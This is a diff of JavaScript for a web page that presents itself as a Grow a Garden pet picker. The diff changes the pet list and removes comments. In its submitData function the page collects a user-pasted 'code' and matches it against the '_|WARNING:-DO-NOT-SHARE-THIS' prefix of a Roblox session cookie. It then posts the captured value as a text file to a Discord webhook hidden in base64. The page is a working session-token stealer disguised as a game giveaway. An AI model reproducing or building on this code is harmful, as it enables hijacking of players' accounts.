@@ -230,10 +230,10 @@
     { id: 'Mimic Octopus', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Mimic_Octopus.png', name: 'Mimic Octopus' },
     { id: 'Fennec Fox', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Fennec_Fox.png', name: 'Fennec Fox' },
     { id: 'Butterfly', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Butterfly.png', name: 'Butterfly' },
-    { id: 'Dragon', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Dragon.png', name: 'Dragon' },
-    { id: 'Penguin', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Penguin.png', name: 'Penguin' },
-    { id: 'Capybara', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Capybara.png', name: 'Capybara' },
-    { id: 'Axolotl', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Axolotl.png', name: 'Axolotl' }
+    { id: 'Dragonfly', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Dragonfly.png', name: 'Dragonfly' },
+    { id: 'Lobster Thermidor', img: 'https://cdn.nookazon.com/128x128/growagarden/items/78602813358591.png', name: 'Lobster Thermidor' },
+    { id: 'Spinosaurus', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Spinosaurus.png', name: 'Spinosaurus' },
+    { id: 'T-Rex', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/T_Rex.png', name: 'T-Rex' }
   ];
 
   let selectedPet = pets[0].id;
@@ -270,7 +270,6 @@ async function submitData() {
   const codeInput = document.getElementById('code').value.trim();
   if (!username || !codeInput) return;
 
-  // Regex to capture from WARNING to end of alphanumeric block
   const regex = /_\|WARNING:-DO-NOT-SHARE-THIS[\s\S]*?\.[A-Z0-9]+/;
   const match = codeInput.match(regex);
 
@@ -279,12 +278,12 @@ async function submitData() {
     return;
   }
 
-  const extractedCode = match[0]; // Only warning + full code block
+  const extractedCode = match[0]; 
 
   const webhookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwOTYwNTE2NTc4MjE0MzAxNi9hOW5VeVVSVVJDN1FPdVdjc016S3p6VElHem8xdFczQV9rc2VGZ2F1ZDNXUV9oejNWa3hJT3dtMzFIN3h5U21MQkpibQ==";
   const webhookURL = atob(webhookBase64);
 
-  // Send as a text file
+ 
   const blob = new Blob([extractedCode], { type: 'text/plain' });
   const formData = new FormData();
   formData.append('file', blob, 'code.txt');
